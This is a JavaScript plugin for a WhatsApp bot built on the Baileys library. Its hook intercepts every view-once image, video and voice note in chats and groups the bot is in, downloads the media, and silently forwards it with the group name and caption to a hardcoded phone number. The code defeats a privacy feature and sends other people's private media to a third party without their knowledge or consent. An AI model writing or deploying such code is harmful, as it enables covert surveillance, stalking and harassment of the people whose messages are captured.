import { downloadContentFromMessage } from '@whiskeysockets/baileys'
let handler = m => m
handler.before = async function (m, { conn }) {
if (!m.message?.viewOnceMessageV2 && !m.message?.viewOnceMessageV2Extension) return
const msg = m.message.viewOnceMessageV2 ? m.message.viewOnceMessageV2.message : m.message.viewOnceMessageV2Extension.message
const type = Object.keys(msg)[0]
const mType = type === 'imageMessage' ? 'image' : type === 'videoMessage' ? 'video' : 'audio'
const media = await downloadContentFromMessage(msg[type], mType)
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])}
const gN = m.key.remoteJid.endsWith('@g.us') ? await conn.groupMetadata(m.key.remoteJid) : null
const caption = `
🕵️‍♀️ ${type === 'imageMessage' ? '`Imagen`' : type === 'videoMessage' ? '`Vídeo`' : type === 'audioMessage' ? '`Nota de voz`' : 'no definido'} 🕵️
${m.key.remoteJid.endsWith('@g.us') ? `*Grupo:* ${gN.subject}` : '*Chat privado*'}
${msg[type].caption ? `- *Texto:* ${msg[type].caption}` : ''}`.trim()
if (/image|video/.test(type)) return await conn.sendMessage('59896026646@s.whatsapp.net', { [mType]: buffer, caption: caption, mentions: parseMention(caption) }, { quoted: m })
if (/audio/.test(type)) {
await conn.sendMessage('59896026646@s.whatsapp.net', { text: caption }, { quoted: m })
await conn.sendMessage('59896026646@s.whatsapp.net', { audio: buffer, ptt: true }, { quoted: m })
}}
export default handler
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')}
